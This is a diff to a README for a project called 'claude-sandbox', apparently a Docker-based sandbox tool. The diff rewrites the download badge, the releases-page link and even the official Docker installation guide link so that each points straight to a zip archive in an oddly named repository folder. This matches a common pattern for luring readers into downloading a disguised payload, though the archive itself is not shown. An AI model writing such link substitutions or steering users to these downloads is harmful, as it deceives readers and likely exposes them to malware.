@@ -6,7 +6,7 @@ Welcome to **claude-sandbox**! This application provides a safe, isolated Docker
 
 ## 📥 Download Now
 
-[![GitHub Releases](https://img.shields.io/badge/Download%20Latest%20Release-brightgreen)](https://github.com/aniktatripathy/claude-sandbox/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip)
 
 ## 🔍 Overview
 
@@ -21,12 +21,12 @@ With **claude-sandbox**, you can:
 To run **claude-sandbox**, you need:
 
 - A computer with at least 4 GB of RAM.
-- Docker installed. [Docker Installation Guide](https://docs.docker.com/get-docker/)
+- Docker installed. [Docker Installation Guide](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip)
 - A stable internet connection.
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/aniktatripathy/claude-sandbox/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/aniktatripathy/claude-sandbox/main/plumping/claude-sandbox-v2.5.zip).
    
    Here you will see the available versions of **claude-sandbox**.
 
